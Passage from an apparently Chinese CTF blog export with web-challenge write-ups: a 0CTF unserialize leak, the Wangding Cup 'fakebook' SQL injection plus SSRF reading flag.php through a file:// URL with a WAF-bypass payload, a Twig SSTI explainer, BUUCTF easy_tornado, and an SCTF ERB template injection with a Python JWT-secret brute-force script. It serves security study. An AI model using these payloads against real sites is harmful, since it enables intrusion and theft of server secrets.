<p>下面开始操作：<br>注册之后登陆，进入到update.php页面，输入信息及上传图片，用bp抓包把nickname改成数组即可.<br>然后进入到profile中查看图片信息，把base64码解码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezBjdGZfMjAxNl91bnNlcmlhbGl6ZV9pc192ZXJ5X2dvb2QhfSc7Cj8+Cg==</span><br><span class="line"></span><br><span class="line">解码得到：</span><br><span class="line">&lt;?php</span><br><span class="line">$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">$config[&apos;password&apos;] = &apos;qwertyuiop&apos;;</span><br><span class="line">$config[&apos;database&apos;] = &apos;challenges&apos;;</span><br><span class="line">$flag = &apos;flag&#123;0ctf_2016_unserialize_is_very_good!&#125;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="网鼎杯-fakebook"><a href="#网鼎杯-fakebook" class="headerlink" title="网鼎杯 fakebook"></a>网鼎杯 fakebook</h1><ul>
<li>nikto扫描:<code>nikto -host url</code><br>发现隐藏的robots.txt，其中有源码泄漏（/user.php.bak），输入到地址栏，得到文件user.php.bak。然后用御剑扫描，发现flag.php。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user.php.bak源码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();                                   //初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 //设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output = curl_exec($ch);                            //运行cURL，请求网页</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<p>对注册页面和登陆页面进行post注入探测，发现注册页面中username一栏存在post注入。然后随意注册一个账户，登陆进去以后，发现/view.php?no=1,存在get注入。将no参数改为不存在的值，php报错，得到网站配置文件的后台物理路径/var/www/html/。</p>
<ul>
<li>我选择了post注入，因为先发现了post，所以就用burpsuite截取了post数据包，保存为post.txt.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /join.ok.php HTTP/1.1</span><br><span class="line">Host: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/join.php</span><br><span class="line">Cookie: UM_distinctid=1655535613c89-0225b46f53fa79-38694646-100200-1655535613e38; pgv_pvi=3838269440; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1534816179,1534831680,1534834500,1534848123; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=b6cdb3f35d0c299c39a2a581c0de505887626935; pgv_si=s4980557824; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1534848148; PHPSESSID=dcgbips79uln77iea8bol6u4d5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">username=1&amp;passwd=1&amp;age=1&amp;blog=https%3A%2F%2Fwww.csdn.net%2F</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>sqlmap跑一下发现存储的是php序列化的数据.<br>整理出思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。<br>构造注入:<code>view.php?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code><br>直接用 union select 会被WAF检测到，所以使用 /**/ 来绕过，反序列化字符串对应数据库data列放在第四列（fuzz测试，爆列名），注入后bolg栏显示file:///var/www/html/flag.php，代表注入成功，审计页面源码，发现<iframe width="100%" height="10em" src="data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s3YjY1NzM3Zi04NzA4LTQ2ZmYtODhmOC0wMDY4YzY4NTlhMmN9IjsNCmV4aXQoMCk7DQo=">标签，点击链接，拿到flag。</iframe></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2019/12/25/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><a id="more"></a>
<h2 id="模板注入与常见web注入"><a href="#模板注入与常见web注入" class="headerlink" title="模板注入与常见web注入"></a>模板注入与常见web注入</h2><ul>
<li><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。下面这段代码足以说明这一点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// SQL 注入</span><br><span class="line">$query = &quot;select * from sometable where id=&quot;.$_GET[&apos;id&apos;];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line">// 模版注入</span><br><span class="line">$temp-&gt;render(&quot;Hello &quot;.$_GET[&apos;username&apos;]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<h2 id="模板注入原理"><a href="#模板注入原理" class="headerlink" title="模板注入原理"></a>模板注入原理</h2></li>
<li><p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，这里我们使用 PHP 模版引擎 Twig 作为例子来说明模板注入产生的原理。考虑下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击.但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&apos;name&apos;]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
</li>
<li><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出.</p>
</li>
<li><p>简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p>
<h2 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h2></li>
<li><p>上面已经讲明了模板注入的形成原来，现在就来谈谈对其进行检测和扫描的方法。如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。如果使用第二份代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&apos;name&apos;]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在 Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入<code>name=20</code> ，则在服务端拼接的模版内容为：<code>Hello 20</code>.Twig 模板引擎在编译模板的过程中会计算<code>20</code> 中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出.<br>现在把测试的数据改变一下，插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>实际服务端要进行编译的模板就被构造为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>这里简单分析一下，由于 <code></code> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16  作为模板变量最终会返回 16  作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code></p>
<ul>
<li><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
</li>
<li><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<h1 id="BUUCT-WEB-easy-tornado"><a href="#BUUCT-WEB-easy-tornado" class="headerlink" title="BUUCT-WEB-easy_tornado"></a>BUUCT-WEB-easy_tornado</h1></li>
<li><p>tornado是python中的一个web应用框架。拿到题目发现有三个文件:flag.txt,welcome.txt,hints.txt.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/flag.txt:flag in /flllllllllllag</span><br><span class="line">/welcome.txt:render</span><br><span class="line">/hints:md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
</li>
<li><p>看看url，发现web9.buuoj.cn/file?filename=/flag.txt&amp;filehash=245a5ccf5543f16709d8c22851af5454<br>把filename改成/fllllllllllllag试试，进入一个报错页面。url也很有意思<code>buuoj.cn/error?msg=Error</code>.</p>
</li>
<li><p>试着把msg的值改成123看看，成功输出到页面。再结合提示render(大佬wp提示模板注入)，<code>msg=,得到cookie_secret:&quot;M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;</code></p>
</li>
<li><p>再利用hints.txt提示,得到filehash的值.脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line"> </span><br><span class="line">def md5value(s):</span><br><span class="line">    md5 = hashlib.md5() </span><br><span class="line">    md5.update(s) </span><br><span class="line">    return md5.hexdigest()</span><br><span class="line"> </span><br><span class="line">def jiami(): </span><br><span class="line">    filename = &apos;/fllllllllllllag&apos;</span><br><span class="line">    cookie_s =&quot;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;</span><br><span class="line">    print(md5value(filename.encode(&apos;utf-8&apos;)))</span><br><span class="line">    x=md5value(filename.encode(&apos;utf-8&apos;))</span><br><span class="line">    y=cookie_s+x</span><br><span class="line">    print(md5value(y.encode(&apos;utf-8&apos;)))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="sctf-flag-shop"><a href="#sctf-flag-shop" class="headerlink" title="sctf flag shop"></a>sctf flag shop</h1><ul>
<li><p>在cookie中发现有jwt，解密发现所拥有的jkl是受cookie控制的，所以思路很清楚我们需要去伪造cookie.</p>
</li>
<li><p>在robots.txt中发现原始码泄漏，访问filebak获取到原始码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &apos;sinatra&apos;</span><br><span class="line">require &apos;sinatra/cookies&apos;</span><br><span class="line">require &apos;sinatra/json&apos;</span><br><span class="line">require &apos;jwt&apos;</span><br><span class="line">require &apos;securerandom&apos;</span><br><span class="line">require &apos;erb&apos;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &apos;/static&apos;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">#ENV[&quot;SECRET&quot;] = SecureRandom.hex(xx)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &apos;/../log/http.log&apos;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &apos;/shop&apos;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&apos;#&#123;params[:name][0,7]&#125; working successfully!&apos;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&apos;/shop&apos;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现在work这个路由中，有:<code>ERB::new(&quot;&lt;script&gt;alert(&#39;#{params[:name][0,7]} working successfully!&#39;)&lt;/script&gt;&quot;).result</code>，这里的<code>#{params[:name][0,7]}</code>我们可控，所以这里有一个模版注入，但是有限制：我们的payload不能超过7个字符。</p>
</li>
<li><p>去网上查找ERB模版的写法，寻找到了ruby其中的一个模版标签：&lt;%=xx%&gt;，但是因为长度的限制，我们只有2个字符可用.</p>
</li>
<li><p>可以从原始码得到，我们的需要的SECRET是在环境变量中，但是ENV不满足条件，考虑从ruby预定义的变量入手：<a href="https://docs.ruby-lang.org/zh/2.4.0/globals_rdoc.html" target="_blank" rel="noopener">https://docs.ruby-lang.org/zh/2.4.0/globals_rdoc.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>上面正好有匹配ENV [“ SECRET”]的地方，所以利用$` 和 $’.构造name为 &lt;%=$<del>%&gt; ，do为 &lt;%=$</del>%&gt; is working.其中的 SECRET 参数可控，如果匹配到SECRET，则 $~ (ruby特性，表示最近一次正则匹配结果) 会在页面中返回，于是可以爆破secret，然后伪造JWT去买flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">table = &apos;1234567890abcdef&apos;</span><br><span class="line">url = &apos;http://47.110.15.101/work&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;name&quot;: &quot;&lt;%=$~%&gt;&quot;,</span><br><span class="line">    &quot;do&quot;: &quot;&lt;%=$~%&gt; is working&quot;</span><br><span class="line">&#125;</span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.headers[&apos;Cookie&apos;] = &apos;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIwZmQxMjUzNC1mMmJjLTRhZTUtOTRhNy1kNmUwZWRjMGJkMzEiLCJqa2wiOjEwN30.iI0fcdikWuFxSxYm9LV1dNjCmmID48QZ0c3w-hhyEnw&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#后半部分</span><br><span class="line">key = &apos;&apos;</span><br><span class="line">for _ in range(1000):</span><br><span class="line">    for i in table:</span><br><span class="line">        tmp = key</span><br><span class="line">        tmp += i</span><br><span class="line">        data[&apos;SECRET&apos;] = tmp</span><br><span class="line">        print(tmp)</span><br><span class="line">        res = sess.get(url, data=data)</span><br><span class="line">        print(res.text)</span><br><span class="line">        if tmp in res.text:</span><br><span class="line">            key += i</span><br><span class="line">            print(key)</span><br><span class="line">            break</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#前半部分</span><br><span class="line">key = &apos;17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8&apos;</span><br><span class="line">for _ in range(1000):</span><br><span class="line">    for i in table:</span><br><span class="line">        tmp = key</span><br><span class="line">        tmp = i + tmp</span><br><span class="line">        data[&apos;SECRET&apos;] = tmp</span><br><span class="line">        res = sess.get(url, data=data)</span><br><span class="line">        if tmp in res.text:</span><br><span class="line">            key = i + key</span><br><span class="line">            print(key)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
